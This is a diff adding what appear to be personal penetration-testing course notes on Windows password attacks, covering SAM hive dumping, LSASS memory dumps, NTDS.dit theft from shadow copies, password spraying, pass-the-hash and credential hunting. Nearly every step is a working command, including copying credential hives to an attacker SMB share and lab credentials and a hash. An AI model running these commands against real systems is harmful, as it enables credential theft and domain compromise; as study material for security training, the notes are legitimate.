@@ -77,5 +77,83 @@
         - Such as Dynamic-Link Libraries (DLL), that perform auth checks
         - Msv1\_0.dll used for non-domain joined and interactive logins
       - SAM or Active Directory
-    - SAM (Security Account Manager)
-      - TODO
+
+
+## Windows Local Password Attack
+### SAM
+- It is beneficial to download hashes locally, then crack them (instead of cracking them on the target). We can do this by copying the SAM registry hives
+- Registry Hives:
+  - `hklm\sam`: Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.
+  - `hklm\system`: Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
+  - `hklm\security`: Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.
+    - \security is not needed, but can be helpful
+- **Using reg.exe save to copy registry hives**
+  - `reg.exe save <registry_hive> C:\<registry_hive>`
+- Create a share:
+  - `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/<user>/Documents/`
+  - `move sam.save \\<ip>\CompData`
+  - `move security.save \\<ip>\CompData`
+  - `move system.save \\<ip>\CompData`
+  - `ls`
+  - Dump hashes offline: `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`
+  - `sudo nano hashestocrack.txt`
+    - Crack the hashes
+- We can also dump LSA secrets remotely (if we have local admin privileges): `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa`
+- We can ALSO dump hashes from the SAM database remotely: `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam`
+
+### LSASS
+- LSASS plays a central role in credential managemetn and authentication
+  - Caches creds in local mem
+  - Creates access tokens
+  - Enforces security policies
+  - Writes to Windows security log
+- **Dump LSASS**
+  - GUI Version
+    - Task Manager > Processes tab > Local Security Authority Process > *Right Click* > Create dump file
+    - This creates a file at: `C:\Users\<usr>\AppData\Local\Temp`
+  - cmd Version: `tasklist /svc`
+  - PowerShell Version: `Get-Process lsass`
+  - Create the lsass dumb in PowerShell:
+    - rundll32 version: `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`
+    - Pypykatz version: `pypykatz lsa minidump /home/<user>/Documents/lsass.dmp`
+
+### Attacking Active Directory & NTDS.dit
+- AD is highly common. There are two main types of attacks when attacking credentials
+- Dictionary Attacks
+  - There are common formats of usernames, which many usernames in a company are likely to follow (eg. firstinitiallastname, firstname.lastname, etc)
+  - We can find these *often* by searching for `@<fqdn>` (eg. @inlanefreight.com), or dorking `<fqdn> filetype:pdf`
+  - Once we have a list of names, we can use username-anarchy to generate the list of names: `./username-anarchy -i /home/<user>/names.txt`
+  - Then, we can launch the attack with CrackMapExec: `crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt`
+  - We can view logs in the Event Viewer
+- Dumping Hashes from NTDS.dit
+  - NTDS.dit is the primary database file associated with AD
+  - Connect to the target via evil-winrm (with the creds we captured previously): `evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'`
+  - Once in, see what privs we have: `net localgroup`
+    - Also: `net user <ouruser>`
+  - Make a volume shadow copy of the C: drive (or whatever drive AD is on): `vssadmin CREATE SHADOW /For=C:`
+  - Copy NTDS.dit from volume shadow copy of C: to another location, to prepare to move NTDS.dit to our attack host: `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`
+  - Move it on over (maybe create a share first)
+  - **Faster Alternative**
+    - `crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds`
+    - Crack the hashes!
+  - **What if we can't crack the hash?**
+    - We can use a type of attack called Pass-the-Hash (PtH)
+      - This takes advantage of the NTLM authentication protocol
+    - `evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"`
+
+### Credential Hunting in Windows
+- Creds are often saved on a local system. How can we find these?
+- **GUI**
+  - Use the Windows Search feature
+  - Search for one of these keywords: `Passwords, Passphrases, Keys, Username, User account, Creds, Users,	Passkeys, Passphrases, configuration, dbcredential, dbpassword, pwd, Login, Credentials`
+- **cmd or Powershell**
+  - Using lazagne:
+    - Install lazagne: https://github.com/AlessandroZ/LaZagne/releases/
+    - `start lazagne.exe all`
+  - Using findstr
+    - `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`
+
+# Linux Local Password Attacks
+
+## Credential Hunting in Linux
+
